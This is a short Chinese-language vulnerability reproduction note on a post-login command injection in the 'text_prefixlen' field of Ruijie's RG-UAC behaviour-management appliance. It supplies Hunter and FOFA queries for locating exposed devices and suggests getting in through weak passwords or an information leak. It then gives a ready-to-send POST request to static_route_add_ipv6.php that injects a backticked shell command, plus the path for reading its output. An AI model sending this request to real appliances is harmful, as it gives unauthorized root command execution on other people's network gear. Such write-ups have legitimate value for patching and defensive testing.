# 锐捷RG-UAC统一上网行为管理审计系统text_prefixlen后台命令执行漏洞

# 一、漏洞简介
锐捷RG-UAC统一上网行为管理审计系统存在命令执行漏洞,可以通过漏洞获取root权限 。

# 二、影响版本
+ 锐捷RG-UAC统一上网行为管理审计系统

# 三、资产测绘
+ hunter`app.name="Ruijie 锐捷 RG-UAC"`
+ fofoa:`app="Ruijie-RG-UAC"`

登录页

![1711942665811-46dbe53d-d2cc-433f-ac40-7a78aa2d4c6c.png](./img/19dwJ1XCwS9pynNa/1711942665811-46dbe53d-d2cc-433f-ac40-7a78aa2d4c6c-002349.png)

# 四、漏洞复现
使用弱口令/敏感信息泄露漏洞登录系统后台

![1714985896501-ee5e7557-a9fe-4b1f-9baa-a777b9f147e5.png](./img/19dwJ1XCwS9pynNa/1714985896501-ee5e7557-a9fe-4b1f-9baa-a777b9f147e5-943780.png)

获取Cookie后使用下面poc

```plain
POST /view/networkConfig/RouteConfig/StaticRoute/static_route_add_ipv6.php HTTP/1.1
Host: 
Cookie: PHPSESSID=ae63a240e1fdfb5614107040d19120f3
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 75

text_ip_addr=0000:0000:0000::0000&text_prefixlen=`ls+>1.txt`&text_gateway=1
```

![1714986473370-9947d45b-a038-4c40-bd35-887ec9be4e2c.png](./img/19dwJ1XCwS9pynNa/1714986473370-9947d45b-a038-4c40-bd35-887ec9be4e2c-905624.png)

```plain
/view/networkConfig/RouteConfig/StaticRoute/1.txt
```

![1714986484395-a1332920-5e93-49c7-9edd-aee6c39718e3.png](./img/19dwJ1XCwS9pynNa/1714986484395-a1332920-5e93-49c7-9edd-aee6c39718e3-180098.png)



> 更新: 2024-06-24 11:42:28  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/knbwbbtehaqo6gv1>